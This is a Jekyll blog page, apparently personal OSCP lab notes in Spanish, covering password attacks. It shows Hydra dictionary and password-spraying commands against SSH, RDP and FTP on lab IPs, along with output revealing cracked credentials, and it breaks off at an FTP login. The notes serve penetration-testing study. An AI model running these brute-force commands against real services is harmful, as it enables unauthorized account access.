@@ -1,0 +1,2993 @@
+<!DOCTYPE html>
+<html lang="en">
+<!-- Beautiful Jekyll 5.0.0 | Copyright Dean Attali 2020 -->
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+  
+
+  
+
+  <title>Password Attacks</title>
+
+  
+  <meta name="author" content="Qv1nTv5">
+  
+
+  <meta name="description" content="Password Attacks Basics.">
+
+  
+
+  
+
+  
+  <link rel="alternate" type="application/rss+xml" title="Home" href="http://localhost:4000/feed.xml">
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+    
+      
+  <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
+
+
+    
+      
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.12.1/css/all.min.css">
+
+
+    
+      
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic">
+
+
+    
+      
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800">
+
+
+    
+  
+
+  
+    
+      <link rel="stylesheet" href="/assets/css/bootstrap-social.css">
+    
+      <link rel="stylesheet" href="/assets/css/beautifuljekyll.css">
+    
+  
+
+  
+
+  
+  
+  
+
+  
+
+  
+  <meta property="og:site_name" content="Home">
+  <meta property="og:title" content="Password Attacks">
+  <meta property="og:description" content="Password Attacks Basics.">
+
+  
+
+  
+  <meta property="og:type" content="article">
+  <meta property="og:article:author" content="Qv1nTv5">
+  <meta property="og:article:published_time" content="2023-11-13T00:00:00-05:00">
+  <meta property="og:url" content="http://localhost:4000/2023-11-13-13.Password_Attacks/">
+  <link rel="canonical" href="http://localhost:4000/2023-11-13-13.Password_Attacks/">
+  
+
+  
+  <meta name="twitter:card" content="summary">
+  
+  <meta name="twitter:site" content="@Qvintvs1">
+  <meta name="twitter:creator" content="@Qvintvs1">
+
+  <meta property="twitter:title" content="Password Attacks">
+  <meta property="twitter:description" content="Password Attacks Basics.">
+
+  
+
+  
+
+
+  
+
+  
+
+</head>
+
+
+<body>
+
+  
+
+
+  <nav class="navbar navbar-expand-xl navbar-light fixed-top navbar-custom top-nav-regular"><a class="navbar-brand" href="http://localhost:4000/">Home</a><button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false" aria-label="Toggle navigation">
+    <span class="navbar-toggler-icon"></span>
+  </button>
+
+  <div class="collapse navbar-collapse" id="main-navbar">
+    <ul class="navbar-nav ml-auto">
+          <li class="nav-item dropdown">
+            <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Program</a>
+            <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                  <a class="dropdown-item" href="/Cpage">C</a>
+                  <a class="dropdown-item" href="/DHARMApage">Dharma</a>
+            </div>
+          </li>
+        
+          <li class="nav-item dropdown">
+            <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Pentest</a>
+            <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                  <a class="dropdown-item" href="/BURPSUITEpage">Burp</a>
+                  <a class="dropdown-item" href="/THMpage">Thm</a>
+                  <a class="dropdown-item" href="/HackTheBoxpage">Htb</a>
+                  <a class="dropdown-item" href="/PEN200page">BasicPentesting</a>
+                  <a class="dropdown-item" href="/REDTEAMBASICSpage">RedTeam</a>
+                  <a class="dropdown-item" href="/BLUETEAMBASICSpage">Blueteam</a>
+                  <a class="dropdown-item" href="/REDESpage">Net</a>
+                  <a class="dropdown-item" href="/2022-11-17-GitBasics">Git</a>
+            </div>
+          </li>
+        
+        <li class="nav-item">
+          <a class="nav-link" id="nav-search-link" href="#" title="Search">
+            <span id="nav-search-icon" class="fa fa-search"></span>
+            <span id="nav-search-text">Search</span>
+          </a>
+        </li></ul>
+  </div>
+
+  
+
+  
+
+</nav>
+
+
+
+<div id="beautifuljekyll-search-overlay">
+
+  <div id="nav-search-exit" title="Exit search">✕</div>
+  <input type="text" id="nav-search-input" placeholder="Search">
+  <ul id="search-results-container"></ul>
+  
+  <script src="https://unpkg.com/simple-jekyll-search@latest/dest/simple-jekyll-search.min.js"></script>
+  <script>
+    var searchjson = '[ \
+       \
+        { \
+          "title"    : "2. Constants and Literals in C.", \
+          "category" : "C", \
+          "url"      : "/2024-12-10-1.ConstantsinC-copy/", \
+          "date"     : "December 10, 2024" \
+        }, \
+       \
+        { \
+          "title"    : "1. Basics of C", \
+          "category" : "C", \
+          "url"      : "/2024-12-02-1.BasicsOfC/", \
+          "date"     : "December  2, 2024" \
+        }, \
+       \
+        { \
+          "title"    : "Gramáticas en Dharma", \
+          "category" : "DHA", \
+          "url"      : "/2024-09-24-Dharma_Tutorial/", \
+          "date"     : "September 24, 2024" \
+        }, \
+       \
+        { \
+          "title"    : "Gramáticas en Dharma", \
+          "category" : "fuzz", \
+          "url"      : "/2024-03-22-Dharma_Tutorial-copy/", \
+          "date"     : "March 22, 2024" \
+        }, \
+       \
+        { \
+          "title"    : "Mi experiencia con el OSCP", \
+          "category" : "pen", \
+          "url"      : "/2023-11-19-PEN200_Experience/", \
+          "date"     : "November 19, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Client Side", \
+          "category" : "pen", \
+          "url"      : "/2023-11-17-17.Client_Side_Attacks/", \
+          "date"     : "November 17, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Deep Packet Tunneling", \
+          "category" : "pen", \
+          "url"      : "/2023-11-16-16.Tunneling_Through_Deep_Packet_Inspection/", \
+          "date"     : "November 16, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Report", \
+          "category" : "pen", \
+          "url"      : "/2023-11-15-15.Making_Reports/", \
+          "date"     : "November 15, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Metasploit", \
+          "category" : "pen", \
+          "url"      : "/2023-11-14-14.Metasploit/", \
+          "date"     : "November 14, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Password Attacks", \
+          "category" : "pen", \
+          "url"      : "/2023-11-13-13.Password_Attacks/", \
+          "date"     : "November 13, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Active Directory Attacks", \
+          "category" : "pen", \
+          "url"      : "/2023-11-12-12.Active_Directory_Attacks/", \
+          "date"     : "November 12, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Port Forwarding", \
+          "category" : "pen", \
+          "url"      : "/2023-11-11-11.Port_Forwarding/", \
+          "date"     : "November 11, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Privilege Escalation", \
+          "category" : "pen", \
+          "url"      : "/2023-11-10-10.Privilege_Escalation/", \
+          "date"     : "November 10, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "File Transfers", \
+          "category" : "pen", \
+          "url"      : "/2023-11-09-9.File_Tranfers/", \
+          "date"     : "November  9, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Buffer Overflows", \
+          "category" : "pen", \
+          "url"      : "/2023-11-08-8.Buffer_Overflows/", \
+          "date"     : "November  8, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Vulnerability Scanning.", \
+          "category" : "pen", \
+          "url"      : "/2023-11-07-7.Vulnerability_Scanning/", \
+          "date"     : "November  7, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Information Gathering", \
+          "category" : "pen", \
+          "url"      : "/2023-11-06-6.Active_Information_Gathering/", \
+          "date"     : "November  6, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Windows", \
+          "category" : "pen", \
+          "url"      : "/2023-11-05-5.Windows/", \
+          "date"     : "November  5, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Networking", \
+          "category" : "pen", \
+          "url"      : "/2023-11-04-4.Networking/", \
+          "date"     : "November  4, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Scripting", \
+          "category" : "pen", \
+          "url"      : "/2023-11-03-3.Scripting/", \
+          "date"     : "November  3, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Practical Tools", \
+          "category" : "pen", \
+          "url"      : "/2023-11-02-2.PracticalTools/", \
+          "date"     : "November  2, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Linux", \
+          "category" : "pen", \
+          "url"      : "/2023-11-01-1.Linux/", \
+          "date"     : "November  1, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Easy", \
+          "category" : "hack", \
+          "url"      : "/2022-12-01-Easy/", \
+          "date"     : "December  1, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Git Basics", \
+          "category" : "", \
+          "url"      : "/2022-11-17-GitBasics/", \
+          "date"     : "November 17, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Tier I", \
+          "category" : "hack", \
+          "url"      : "/2022-11-10-Tier_1/", \
+          "date"     : "November 10, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Tier 0", \
+          "category" : "hack", \
+          "url"      : "/2022-11-09-Tier_0/", \
+          "date"     : "November  9, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "7.BufferOverflow.", \
+          "category" : "thm", \
+          "url"      : "/2022-11-02-7.BufferOverflow/", \
+          "date"     : "November  2, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "6.Offensive Pentesting", \
+          "category" : "thm", \
+          "url"      : "/2022-11-01-6.OffensivePentesting/", \
+          "date"     : "November  1, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "5.RedTeam", \
+          "category" : "thm", \
+          "url"      : "/2022-10-30-5.RedTeam/", \
+          "date"     : "October 30, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "4.Windows", \
+          "category" : "thm", \
+          "url"      : "/2022-10-22-4.Windows/", \
+          "date"     : "October 22, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "3.Junior Penetrationtester path", \
+          "category" : "thm", \
+          "url"      : "/2022-09-02-3.JRPenetrationTester/", \
+          "date"     : "September  2, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "2.Complete Begginer path.", \
+          "category" : "thm", \
+          "url"      : "/2022-08-07-2.CompleteBegginer/", \
+          "date"     : "August  7, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "1.Pre-Security path.", \
+          "category" : "thm", \
+          "url"      : "/2022-07-11-1Pre-Security/", \
+          "date"     : "July 11, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "0.Scripting for pentesters.", \
+          "category" : "thm", \
+          "url"      : "/2022-07-10-0.Scripting_for_pentesters/", \
+          "date"     : "July 10, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Burp Certified Practitioner Practice Exam.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-30-PracticeExam/", \
+          "date"     : "March 30, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "22. OAuth Authentication.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-27-22.OAuth_authentication/", \
+          "date"     : "March 27, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "21. HTTP Request Smuggling.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-26-21.HTTP_request_smuggling/", \
+          "date"     : "March 26, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "20. HTTP Host Header Attacks.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-25-20.HTTP_Host_header_attacks/", \
+          "date"     : "March 25, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "19. Web Cache Poisoning.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-24-19.Web_cache_poisoning/", \
+          "date"     : "March 24, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "18. Server-Side Template Injection.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-23-18.Serve-side_template_injection/", \
+          "date"     : "March 23, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "17. Insecure Deserialization.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-22-17.Insecure_deserialization/", \
+          "date"     : "March 22, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "16. WebSockets.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-21-16.WebSockets/", \
+          "date"     : "March 21, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "15.DOM-based XSS vulnerabilities.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-20-15-DOM-based_vulnerabilities/", \
+          "date"     : "March 20, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "14. Clickjacking.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-19-14.Clickjacking/", \
+          "date"     : "March 19, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "13. Cross-Origin Resource Sharing.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-18-13.Cross-origin_resource_sharing_(CORS)/", \
+          "date"     : "March 18, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "12. Cross-Site Request Forgery.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-17-12.Cross-site_request_forgery_(CSRF)/", \
+          "date"     : "March 17, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "11. Cross-Site Scripting.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-16-11.Cross-site_scripting_(XSS)/", \
+          "date"     : "March 16, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "10. XXE Injection.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-15-10.XXE_injection/", \
+          "date"     : "March 15, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "9. Server-Side Request Forgery.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-14-9.Server-side_request_forgery/", \
+          "date"     : "March 14, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "8. File Upload.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-13-8.File_upload_vulnerabilities/", \
+          "date"     : "March 13, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "7. Access Control.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-12-7.Access_control/", \
+          "date"     : "March 12, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "6. Information Disclosure.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-11-6.Information_disclosure/", \
+          "date"     : "March 11, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "5. Bussiness Logic Vulnerabilities.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-10-5.Business_logic_vulnerabilities/", \
+          "date"     : "March 10, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "4. Command Injection.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-09-4.Command_Injection/", \
+          "date"     : "March  9, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "3. Directory Traversal.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-08-3.Directory_Traversal/", \
+          "date"     : "March  8, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "2. Authentication.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-07-2.Authentication/", \
+          "date"     : "March  7, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "1. SQLInjection", \
+          "category" : "burp", \
+          "url"      : "/2022-03-06-1.SQLInjection/", \
+          "date"     : "March  6, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Seguridad Perimetral", \
+          "category" : "blueteam", \
+          "url"      : "/2022-02-09-Seguridad_Perimetral/", \
+          "date"     : "February  9, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Hardening de sistemas", \
+          "category" : "blueteam", \
+          "url"      : "/2022-02-09-Hardening_de_sistemas/", \
+          "date"     : "February  9, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Bandit", \
+          "category" : "otw", \
+          "url"      : "/2022-02-08-Bandit/", \
+          "date"     : "February  8, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Proxy", \
+          "category" : "redes", \
+          "url"      : "/2022-02-07-Proxys/", \
+          "date"     : "February  7, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Protocolos Relevantes", \
+          "category" : "redes", \
+          "url"      : "/2022-02-07-Protocolos_Importantes/", \
+          "date"     : "February  7, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Curso Básico Redes", \
+          "category" : "redes", \
+          "url"      : "/2022-02-07-Precurso_Redes/", \
+          "date"     : "February  7, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "IPs", \
+          "category" : "redes", \
+          "url"      : "/2022-02-07-IPs/", \
+          "date"     : "February  7, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Movimientos Laterales", \
+          "category" : "redteam", \
+          "url"      : "/2022-02-06-Introducci%C3%B3n_a_movimientos_laterales/", \
+          "date"     : "February  6, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Evasión de Defensas", \
+          "category" : "redteam", \
+          "url"      : "/2022-02-05-Evasi%C3%B3n_de_Defensas/", \
+          "date"     : "February  5, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Escalada de privilegios", \
+          "category" : "redteam", \
+          "url"      : "/2022-02-05-Escalada_de_privilegios/", \
+          "date"     : "February  5, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Metasploit", \
+          "category" : "redteam", \
+          "url"      : "/2022-02-04-Metasploit_B%C3%A1sico/", \
+          "date"     : "February  4, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Ataques a aplicaciones Android", \
+          "category" : "redteam", \
+          "url"      : "/2022-02-03-Ataques_aplicaciones_android/", \
+          "date"     : "February  3, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Ataque a aplicaciones web.", \
+          "category" : "redteam", \
+          "url"      : "/2022-02-02-Ataques_a_aplicaciones_web/", \
+          "date"     : "February  2, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Ataques a Infraestructuras y Redes", \
+          "category" : "redteam", \
+          "url"      : "/2022-02-01-Ataques_a_Infraestructuras_y_Redes/", \
+          "date"     : "February  1, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Análisis de Objetivos", \
+          "category" : "redteam", \
+          "url"      : "/2022-01-28-An%C3%A1lisis_de_Objetivos/", \
+          "date"     : "January 28, 2022" \
+        }, \
+       \
+       \
+        { \
+          "title"    : "Blueteam Basics", \
+          "category" : "page", \
+          "url"      : "/BLUETEAMBASICSpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "PortSwigger BurpSuite Course", \
+          "category" : "page", \
+          "url"      : "/BURPSUITEpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "C programming subjects.", \
+          "category" : "page", \
+          "url"      : "/Cpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Dharma Fuzzer language", \
+          "category" : "page", \
+          "url"      : "/DHARMApage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Exploiting &amp; Reversing", \
+          "category" : "page", \
+          "url"      : "/EXPREVpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Fuzzing JavaScript Engine", \
+          "category" : "page", \
+          "url"      : "/Fuzzpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "HackTheBox", \
+          "category" : "page", \
+          "url"      : "/HackTheBoxpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "PEN200 notes", \
+          "category" : "page", \
+          "url"      : "/PEN200page/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Proyectos", \
+          "category" : "page", \
+          "url"      : "/PROJECTSpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Networking Basics", \
+          "category" : "page", \
+          "url"      : "/REDESpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "RedTeam Basics", \
+          "category" : "page", \
+          "url"      : "/REDTEAMBASICSpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Retired Machines", \
+          "category" : "page", \
+          "url"      : "/RetiredMachinespage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "TryHackMe", \
+          "category" : "page", \
+          "url"      : "/THMpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "About me", \
+          "category" : "page", \
+          "url"      : "/aboutme/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "THM", \
+          "category" : "page", \
+          "url"      : "/preOSCPpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Tag Index", \
+          "category" : "page", \
+          "url"      : "/tags/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page2/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page3/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page4/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page5/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page6/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page7/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page8/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page9/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page10/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page11/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page12/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page13/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page14/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page15/", \
+          "date"     : "January 1, 1970" \
+        } \
+       \
+    ]';
+    searchjson = JSON.parse(searchjson);
+
+    var sjs = SimpleJekyllSearch({
+      searchInput: document.getElementById('nav-search-input'),
+      resultsContainer: document.getElementById('search-results-container'),
+      json: searchjson
+    });
+  </script>
+</div>
+
+
+
+
+
+  <!-- TODO this file has become a mess, refactor it -->
+
+
+
+
+
+
+
+<header class="header-section ">
+
+<div class="intro-header no-img">
+  <div class="container-md">
+    <div class="row">
+      <div class="col-xl-8 offset-xl-2 col-lg-10 offset-lg-1">
+        <div class="post-heading">
+          <h1>Password Attacks</h1>
+          
+            
+              <h2 class="post-subheading">Password Attacks Basics.</h2>
+            
+          
+
+          
+            <span class="post-meta">Posted on November 13, 2023</span>
+            
+            
+          
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+</header>
+
+
+
+
+
+<div class=" container-md ">
+  <div class="row">
+    <div class=" col-xl-8 offset-xl-2 col-lg-10 offset-lg-1 ">
+
+      
+
+      
+
+      <article role="main" class="blog-post">
+        <p>En esta sección vamos a cubrir los siguientes temas:</p>
+
+<ul>
+  <li>Attacking network services logins.</li>
+  <li>Password Cracking Fundamentals.</li>
+  <li>Working with passwords hashings.</li>
+</ul>
+
+<p><br /></p>
+
+<h3 id="211-attacking-networks-services-login">21.1. Attacking Networks Services Login.</h3>
+
+<p><strong>SSH y RDP</strong></p>
+
+<p>En esta sección vamos a ver cómo lanzar lo que se denomina como un ataque de lista de diccionario contra servicios de administración remota tanto de Linux (SSH) como de Windows (RDP) con la herramienta Hydra. El comando prototipo es el siguiente:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo hydra -L &lt;wordlist&gt; -P &lt;wordlist&gt; &lt;protocol&gt;://&lt;IP&gt;
+</code></pre></div></div>
+
+<p>Este comando utiliza una lista para nombres de usuario y contraseñas (-L y -P) respectivamente contra un servicio hosteado en una IP.</p>
+
+<p>Un ejemplo sería:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202
+...
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:14344399/p:1), ~3586100 tries per task
+[DATA] attacking rdp://192.168.50.202:3389/
+...
+[3389][rdp] host: 192.168.50.202   login: daniel   password: SuperS3cure1337#
+[ERROR] freerdp: The connection failed to establish.
+[3389][rdp] host: 192.168.50.202   login: justin   password: SuperS3cure1337#
+[ERROR] freerdp: The connection failed to establish.
+...
+</code></pre></div></div>
+
+<p>Observemos que las opciones -l y -p se utilizan para dar o un nombre de usuario o una contraseña en lugar de una lsita de candidatos.</p>
+
+<p>Kali tiene disponible wordlists en /usr/share/wordlists.</p>
+
+<p><br /></p>
+
+<p><strong>Exercises</strong></p>
+
+<p><strong>1. Follow the steps outlined in this section to leverage a dictionary attack to get access to SSH (port 2222) on VM #1 (BRUTE). Find the flag in the george user’s home directory.</strong></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra 192.168.207.201 -l george -P /usr/share/wordlists/rockyou.txt ssh -s 2222
+Hydra v9.4 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-04-26 06:09:46
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking ssh://192.168.207.201:2222/
+[2222][ssh] host: 192.168.207.201   login: george   password: chocolate
+</code></pre></div></div>
+
+<p>Con el comando anterior hemos realizado un ataque sobre SSH en el puerto 2222 con el nombre de usuario george y la lista de candidatos rockyou.txt.</p>
+
+<p><br /></p>
+
+<p><strong>2.  Follow the steps outlined in this section to leverage a dictionary attack to gain access to RDP on VM #2 (BRUTE2). Find the flag on either one of the user’s desktops. To reduce the time it takes to perform the password spraying, you can create a list with the two usernames <em>justin</em> and <em>daniel</em>.</strong></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra rdp://192.168.207.202 -L usernames.txt -p "SuperS3cure1337#" -t 20 -I
+Hydra v9.4 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-04-26 06:36:44
+[WARNING] rdp servers often don't like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover
+[INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)
+[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
+[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 2 tasks per 1 server, overall 2 tasks, 2 login tries (l:2/p:1), ~1 try per task
+[DATA] attacking rdp://192.168.207.202:3389/
+[3389][rdp] host: 192.168.207.202   login: justin   password: SuperS3cure1337#
+[3389][rdp] host: 192.168.207.202   login: daniel   password: SuperS3cure1337#
+</code></pre></div></div>
+
+<p><br /></p>
+
+<p><strong>3. Enumerate VM #3 (BRUTE2) and find another network service. Use the knowledge from this section to get access as the <em>itadmin</em> user and find the flag.</strong></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> hydra ftp://192.168.207.202 -l itadmin -P /usr/share/wordlists/rockyou.txt 
+Hydra v9.4 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-04-26 06:44:13
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking ftp://192.168.207.202:21/
+[21][ftp] host: 192.168.207.202   login: itadmin   password: hellokitty
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-04-26 06:44:18
+                                                                                                                    
+┌──(kali㉿kali)-[~]
+└─$ ftp itadmin@192.168.207.202       
+Connected to 192.168.207.202.
+220-FileZilla Server 1.4.1
+220 Please visit https://filezilla-project.org/
+331 Please, specify the password.
+Password: 
